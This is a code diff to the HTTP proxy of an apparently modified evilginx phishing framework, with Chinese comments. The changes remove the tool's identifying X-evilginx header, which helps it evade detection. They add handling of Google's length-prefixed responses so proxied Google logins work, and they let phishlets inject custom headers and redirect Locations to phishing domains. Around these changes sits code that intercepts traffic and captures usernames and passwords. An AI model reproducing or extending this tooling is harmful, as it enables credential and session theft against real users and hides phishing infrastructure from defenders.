@@ -31,6 +31,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unicode/utf8"
 
 	"golang.org/x/net/proxy"
 
@@ -137,7 +138,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	})
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
-
+	// 处理浏览器请求
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
@@ -150,7 +151,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
-			// handle ip blacklist
+			// handle ip blacklist 判断IP黑名单
 			from_ip := req.RemoteAddr
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
@@ -177,7 +178,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
+			// o_host := req.Host // o_host仅用于设置X-evilginx头
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -365,9 +366,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if l.RedirectUrl != "" {
 											session.RedirectURL = l.RedirectUrl
 										}
-										if session.RedirectURL != "" {
-											session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-										}
+										// 去除：重定向URL替换成钓鱼URL
+										// if session.RedirectURL != "" {
+										// 	session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+										// }
 										session.PhishLure = l
 										log.Debug("redirect URL (lure): %s", session.RedirectURL)
 									}
@@ -409,8 +411,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
-
+				// //添加X-evilginx头
+				// req.Header.Set(p.getHomeDir(), o_host)
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -545,10 +547,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+							// log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+							// log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
 							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								log.Info("intercepted request: %s", r_host)
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime, ic.headers)
 							}
 						}
 					}
@@ -606,7 +609,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// 添加evilginx标识头
+					// req.Header.Set(p.getHomeDir(), o_host)
+
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -624,7 +629,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
 
 						if json_re.MatchString(contentType) {
-
+							// 获取用户名密码
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
@@ -660,7 +665,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-						} else if form_re.MatchString(contentType) {
+						} else if form_re.MatchString(contentType) && !strings.HasPrefix(string(body), "[") { //去掉json数组 by horris
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -757,7 +762,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
 					}
 				}
 
@@ -836,6 +841,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
 					resp.Header.Set("Location", r_url.String())
+					log.Debug("Location: %s", r_url.String())
 				}
 			}
 
@@ -1053,10 +1059,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if s, ok := p.sessions[ps.SessionId]; ok {
 								js_params = &s.Params
 							}
-							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							// log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+							log.Debug("js_params: %s", js_params)
 							if err == nil {
 								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								log.Debug("js_inject: injected redirect script id: %s", js_id)
 							}
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
@@ -1064,6 +1072,64 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				// // start code by horris
+				// // handle google special response 处理google特殊响应
+				PREFIX := []byte(")]}'\n\n")
+				if bytes.HasPrefix(body, PREFIX) {
+					handleGoogleResponse := func(body []byte) []byte {
+						pattern := `(?m)^(?P<length>\d+)\n(?P<json>\[.*\])$`
+						regExp := regexp.MustCompile(pattern)
+						matches := regExp.FindAllSubmatch(body, -1)
+						if matches == nil {
+							return body
+						}
+						results := []map[string][]byte{}
+						for _, match := range matches {
+							result := map[string][]byte{}
+							for i, name := range regExp.SubexpNames() {
+								if i != 0 && name != "" {
+									result[name] = match[i]
+								}
+							}
+							results = append(results, result)
+						}
+						buffer := bytes.NewBufferString(string(PREFIX))
+						for _, result := range results {
+							length, err := strconv.Atoi(string(result["length"]))
+							if err != nil {
+								log.Info("转换失败:", err)
+								continue
+							}
+							jsonLength := utf8.RuneCount(result["json"]) + 2
+							if jsonLength != length {
+								log.Debug("长度不匹配 %d -> %d", length, jsonLength)
+								log.Debug("json: %s", string(result["json"]))
+								result["length"] = []byte(strconv.Itoa(jsonLength))
+							}
+							formatted := fmt.Sprintf("%s\n%s\n", result["length"], result["json"])
+							buffer.WriteString(formatted)
+						}
+						result := buffer.Bytes()
+						// 计算当前文本的长度
+						bodyLength := utf8.RuneCount(result)
+						// 定义正则表达式匹配最后一个数字
+						re := regexp.MustCompile(`(\d+)\]\]\n$`)
+						// // 查找最后一个数字
+						lastNumber := re.Find(result)
+						log.Debug("[xwj] Last number: %s", string(lastNumber))
+						// 替换最后一个数字为新值
+						newBody := re.ReplaceAll(result, []byte(strconv.Itoa(bodyLength)+"]]\n"))
+						return newBody
+					}
+
+					newBody := handleGoogleResponse(body)
+					if len(newBody) != len(body) {
+						newBody = handleGoogleResponse(newBody)
+					}
+					body = newBody
+
+				}
+				// // end code by horris
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
@@ -1165,7 +1231,8 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	return req, nil
 }
 
-func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
+// 增加参数header，可用于phishlets通过intercept自定义header
+func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string, headers string) (*http.Request, *http.Response) {
 	if mime == "" {
 		mime = "text/plain"
 	}
@@ -1174,6 +1241,25 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 		origin := req.Header.Get("Origin")
 		if origin != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", origin)
+		}
+		if headers != "" {
+			var data map[string]interface{}
+			err := json.Unmarshal([]byte(headers), &data)
+			log.Debug("headers: %s", headers)
+			if err == nil {
+				for k, v := range data {
+					value := fmt.Sprintf("%v", v)
+					if k == "Location" {
+						log.Debug("Location: %s", value)
+						if r_host, ok := p.replaceHostWithPhished(value); ok {
+							value = r_host
+						}
+					}
+					resp.Header.Set(k, value)
+				}
+			} else {
+				log.Debug("json.Unmarshal failed: %v", err)
+			}
 		}
 		return req, resp
 	}
@@ -1602,8 +1688,10 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 				continue
 			}
 			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+				orig_combineHost := combineHost(ph.orig_subdomain, ph.domain)
+				if hostname == orig_combineHost {
+					ph_combieHost := combineHost(ph.phish_subdomain, phishDomain)
+					return prefix + ph_combieHost, true
 				}
 				if hostname == ph.domain {
 					return prefix + phishDomain, true
